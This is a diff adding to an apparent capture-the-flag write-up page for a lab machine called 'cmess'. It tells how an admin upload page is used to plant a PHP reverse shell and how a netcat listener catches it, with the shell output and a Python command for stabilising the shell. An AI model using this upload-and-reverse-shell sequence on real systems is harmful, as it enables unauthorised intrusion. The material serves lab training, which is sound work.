@@ -36,6 +36,7 @@
                         <li><a class="smoothscroll" href="#top"> Top </a></li>
                         <li><a class="smoothscroll" href="#recon"> Recon </a></li>
                         <li><a class="smoothscroll" href="#access"> Gaining Access </a></li>
+                        <li><a class="smoothscroll" href="#latmov"> LatMov </a></li>
                         <li><a class="smoothscroll" href="#privesc"> PrivEsc </a></li>
                         <li><a href="../../"> Home </a></li>
                     </ul>
@@ -179,6 +180,37 @@ Requests/sec.: 81.27969
                     <img class="writeup-img" src="../../../assets/img/thm/cmess/home_dash.png">
                 </div>
                 <p class="writeup-text"> And it works ! What's next ? We should find an entry point to get initial access to target machine. </p>
+                <p class="writeup-text"> By searching and exploring the dashboard, I found a very useful page which permits admin to upload any file in the structure : </p>
+                <div>
+                    <img class="writeup-img" src="../../../assets/img/thm/cmess/dash_upload.png">
+                </div>
+                <p class="writeup-text"> As soon as I found this, I immediatly uploaded my custom <a href="https://github.com/4m4Sec/php-reverse-shell">PHP reverse shell</a> and it worked ! </p>
+                <div>
+                    <img class="writeup-img" src="../../../assets/img/thm/cmess/uploaded_success.png">
+                </div>
+                <p class="writeup-text"> But the uploaded file was not located in the root folder. After some research, I found out in what folder it was : in the "assets" directory. </p>
+                <div>
+                    <img class="writeup-img" src="../../../assets/img/thm/cmess/upload_loc.png">
+                </div>
+                <p class="writeup-text"> After openned a netcat connection under port 4444, I clicked on the rev-shell.php file and it worked perfectly ! </p>
+                <p class="writeup-text">
+                    <code class="shell-response">
+$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.18.43.24] from (UNKNOWN) [10.10.91.94] 38396
+Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+08:16:02 up 33 min,  0 users,  load average: 0.00, 0.00, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+                    </code>
+                </p>
+                <p class="writeup-text"> Then, I stabilized my shell with python3 : </p>
+                <p class="writeup-text"><code>$ python3 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+            </div>
+
+            <div class="wt-section" id="latmov">
+                <h1> Lateral Movement </h1>
             </div>
 
             <div class="wt-section" id="privesc">
